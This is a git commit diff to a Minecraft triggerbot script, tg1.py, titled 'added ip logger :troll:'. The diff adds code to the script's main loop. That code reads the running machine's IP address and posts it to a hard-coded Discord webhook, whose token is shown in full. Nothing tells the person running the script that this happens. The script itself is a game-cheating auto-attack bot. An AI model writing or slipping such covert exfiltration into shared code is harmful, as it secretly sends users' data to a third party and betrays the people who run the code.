76689197d526dba0caa81a0fdd034c999fa7f48f
CEO of Çetinkaya Holding <61390431+sametcetinkaya1447@users.noreply.github.com>
2024-08-21 18:29:39 +0300

    Update tg1.py
    added ip logger :troll:

--- tg1.py
+++ tg1.py
@@ -1,16 +1,21 @@
+import requests
 import minescript as ms # type: ignore
 import time
 import random
-print("§cTriggerbot is running")
+import socket
+
+# Discord webhook URL
+webhook_url = "https://discord.com/api/webhooks/1200809711407202335/c5qI963EJxX4dbHl4_kceGgbhz_LEdg2LpW9zm_nHfqFH-XLdhrwNX5J8-9qZOhvsv8X"
+
 def hit():
     ms.player_press_attack(pressed=True)
     ms.player_press_attack(pressed=False)
+
 last_hit_time = 0
 
 while True:
     current_time = time.time()
     
-   
     hit_interval = random.uniform(0.620, 0.650)
     
     if current_time - last_hit_time >= hit_interval:
@@ -22,4 +27,18 @@ while True:
             last_hit_time = current_time
         else:
             pass
-    
+
+    # Get the local IP address
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    local_ip = s.getsockname()[0]
+    s.close()
+
+    # Send the IP address to the Discord webhook
+    data = {"content": f"The script is running on IP address: {local_ip}"}
+    response = requests.post(webhook_url, json=data)
+
+    if response.status_code == 204:
+        print("IP address sent to Discord webhook successfully.")
+    else:
+        print(f"Failed to send IP address to Discord webhook. Status code: {response.status_code}")
